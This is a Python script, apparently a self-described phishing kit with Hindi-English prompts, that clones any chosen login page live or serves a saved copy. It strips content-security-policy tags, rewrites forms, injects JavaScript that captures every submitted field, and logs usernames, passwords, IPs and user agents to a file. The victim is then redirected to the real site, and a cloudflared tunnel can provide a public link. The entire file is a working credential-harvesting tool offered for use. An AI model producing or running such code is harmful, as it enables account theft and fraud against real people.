#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""logme.py v3 — server ab sach me chalega"""
import json, re, socket, subprocess, sys, threading, time, urllib.request, urllib.error
from datetime import datetime
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qs

BASE = Path(__file__).resolve().parent
LOG_FILE = BASE / "log.bin"
SITE_DIR = BASE / "site"
SITE_DIR.mkdir(exist_ok=True)
LOCK = threading.Lock()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

SNIP = """<script>
(function(){
  function send(d){
    try{ navigator.sendBeacon('/__log', new URLSearchParams(d)); }
    catch(e){
      var x=new XMLHttpRequest();
      x.open('POST','/__log',true);
      x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
      x.send(new URLSearchParams(d).toString());
    }
  }
  function grab(f){
    var d={};
    for(var i=0;i<f.elements.length;i++){
      var el=f.elements[i];
      if(el.name && el.type!=='submit' && el.type!=='button') d[el.name]=el.value;
    }
    return d;
  }
  document.addEventListener('submit', function(e){
    var f=e.target;
    if(!f || f.tagName!=='FORM') return;
    if(f.action && f.action.indexOf('/__login')!==-1) return;
    var d=grab(f);
    d['__page']=location.href;
    send(d);
  }, true);
})();
</script>"""


def prepare_html(html, base_url=""):
    html = re.sub(r'(?i)<meta[^>]+http-equiv=["\']?content-security-policy[^>]*>', '', html)
    html = re.sub(r'(?i)<base\b[^>]*>', '', html)
    def _rewrite(m):
        tag = m.group(0)
        am = re.search(r'\saction="([^"]*)"', tag, re.I)
        if am:
            act = am.group(1)
            new = re.sub(r'\saction="[^"]*"', ' action="/__login"', tag, count=1, flags=re.I)
        else:
            act = base_url or "/"
            new = tag[:-1] + ' action="/__login"' + tag[-1]
        if not re.search(r'(?i)\bmethod\s*=', new):
            new = new[:-1] + ' method="POST"' + new[-1]
        else:
            new = re.sub(r'(?i)(\smethod\s*=\s*)"get"', r'\1"POST"', new, count=1)
        return new + f'<input type="hidden" name="__orig_action" value="{act}">'
    html = re.sub(r'<form\b[^>]*>', _rewrite, html, flags=re.I)
    if "</body>" in html.lower():
        html = re.sub(r'(?i)</body>', SNIP + "</body>", html, count=1)
    else:
        html += SNIP
    return html


def http_get(url, timeout=20):
    req = urllib.request.Request(url, headers={
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read(), r.headers.get("Content-Type", ""), r.geturl()


class H(BaseHTTPRequestHandler):
    mode = "file"
    target = ""
    server_version = "nginx"
    sys_version = ""

    def log_message(self, fmt, *args):
        print(f"[>] {self.command} {self.path} -> {fmt % args}")

    def _send(self, code, body, ctype="text/html", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        if ctype.startswith("text") or "javascript" in ctype or "json" in ctype:
            ctype += "; charset=utf-8"
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _log(self, data):
        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "?")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with LOCK:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n[{ts}] IP: {ip} | UA: {ua}\n")
                if isinstance(data, dict):
                    for k, v in data.items():
                        f.write(f"    {k} = {v}\n")
                else:
                    f.write(f"    {data}\n")
                f.write("-" * 50 + "\n")
        print(f"[+] LOGGED from {ip}: {data}")

    def _read_body(self):
        ln = int(self.headers.get("Content-Length", 0) or 0)
        return self.rfile.read(ln).decode("utf-8", "replace") if ln else ""

    def _parse(self, raw):
        raw = raw.strip()
        if not raw:
            return {}
        if raw.startswith("{"):
            try:
                j = json.loads(raw)
                if isinstance(j, dict):
                    return j
            except Exception:
                pass
        try:
            d = {k: v[0] for k, v in parse_qs(raw).items()}
            if d:
                return d
        except Exception:
            pass
        return {"raw": raw}

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/__log":
            return self._send(204, b"", "text/plain")

        if self.mode == "proxy":
            url = self.target if path in ("/", "/index.html") else urljoin(self.target, path)
            print(f"[*] Fetching {url}")
            try:
                data, ctype, final_url = http_get(url)
            except urllib.error.HTTPError as e:
                return self._send(e.code, str(e).encode(), "text/plain")
            except Exception as e:
                return self._send(502, f"Proxy error: {e}".encode(), "text/plain")
            if "html" in ctype.lower():
                self._log({"__event": "VISIT", "page": path})
                html = data.decode("utf-8", "replace")
                return self._send(200, prepare_html(html, final_url), "text/html")
            return self._send(200, data, ctype.split(";")[0].strip() or "application/octet-stream")

        name = "index.html" if path in ("/", "/index.html") else path.lstrip("/")
        f = (SITE_DIR / name).resolve()
        if not str(f).startswith(str(SITE_DIR.resolve())) or not f.is_file():
            return self._send(404, b"404 Not Found", "text/plain")
        data = f.read_bytes()
        if f.suffix.lower() in (".html", ".htm"):
            self._log({"__event": "VISIT", "page": "/" + name})
            return self._send(200, prepare_html(data.decode("utf-8", "replace")), "text/html")
        ctype = {".css": "text/css", ".js": "application/javascript",
                 ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                 ".gif": "image/gif", ".svg": "image/svg+xml", ".ico": "image/x-icon",
                 ".woff2": "font/woff2"}.get(f.suffix.lower(), "application/octet-stream")
        self._send(200, data, ctype)

    def do_POST(self):
        data = self._parse(self._read_body())
        if self.path == "/__log":
            self._log(data)
            return self._send(204, b"", "text/plain")
        if self.path == "/__login":
            self._log(data)
            orig = data.pop("__orig_action", "") or ""
            if orig.startswith(("http://", "https://")):
                loc = orig
            elif self.mode == "proxy" and self.target:
                loc = urljoin(self.target, orig)
            else:
                loc = self.headers.get("Referer", "/")
            return self._send(302, b"", "text/html", {"Location": loc})
        self._log(data)
        self._send(404, b"", "text/plain")


def lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def start_tunnel(port):
    import shutil
    exe = shutil.which("cloudflared")
    if not exe:
        print("[!] cloudflared nahi mila — public link nahi ban payega")
        return None, None
    p = subprocess.Popen([exe, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    for line in iter(p.stdout.readline, ""):
        if "trycloudflare.com" in line:
            for tok in line.split():
                if tok.startswith("https://"):
                    return tok, p
    return None, p


def main():
    print("""
  logme.py v3 (FIXED) — server ab chalega
  Mode 1: apni HTML file
  Mode 2: kisi bhi site ka LIVE clone
  Devloper: siddharth kabir kumar
  instagram: https://instagram.com/siddharth_kumarx
  github: https://github.com/siddharth46500/phishkit.git
------------------------------------------""")
    ch = input("Mode: [1] apni HTML file   [2] kisi bhi site ka LIVE clone\n>>> ").strip()
    H.mode = "proxy" if ch == "2" else "file"

    if H.mode == "proxy":
        target = input("Target URL (jaise https://github.com/login): ").strip()
        if not target.lower().startswith("http"):
            target = "https://" + target
        print("[*] Test fetch ...")
        try:
            data, ctype, _ = http_get(target)
            print(f"[+] OK — {len(data)} bytes")
        except Exception as e:
            print(f"[!] Target tak nahi pahunche: {e}")
            sys.exit(1)
        H.target = target
    else:
        files = sorted(f.name for f in SITE_DIR.iterdir() if f.suffix.lower() in (".html", ".htm"))
        if not files:
            sys.exit(f"[!] '{SITE_DIR}' folder khali hai — usme github.html jaisi file daalo")
        print(f"[+] site/ me mili: {', '.join(files)}")

    try:
        port = int(input("Port (default 8080): ").strip() or "8080")
    except ValueError:
        port = 8080

    # ---- YEH 2 LINES SABSE IMPORTANT HAIN ----
    srv = ThreadingHTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    print(f"\n[+] Server ready -> http://localhost:{port}")
    print(f"[+] LAN pe -> http://{lan_ip()}:{port}")
    if H.mode == "file":
        for fn in sorted(f.name for f in SITE_DIR.iterdir() if f.suffix.lower() in (".html", ".htm")):
            print(f"[+] Link: http://localhost:{port}/{fn}")
    else:
        print(f"[+] Live clone: {H.target}")

    tunnel_proc = None
    if input("\n[?] Public link chahiye? (cloudflared) [y/N]: ").strip().lower() == "y":
        url, proc = start_tunnel(port)
        if url:
            print(f"[+] PUBLIC LINK: {url}")
        tunnel_proc = proc

    print(f"\n[+] Credentials + IP yahan jayenge: {LOG_FILE}")
    print("[+] Ctrl+C se band karo.\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Band ho raha hai ...")
        srv.shutdown()
        srv.server_close()
        if tunnel_proc:
            tunnel_proc.terminate()


if __name__ == "__main__":
    main()
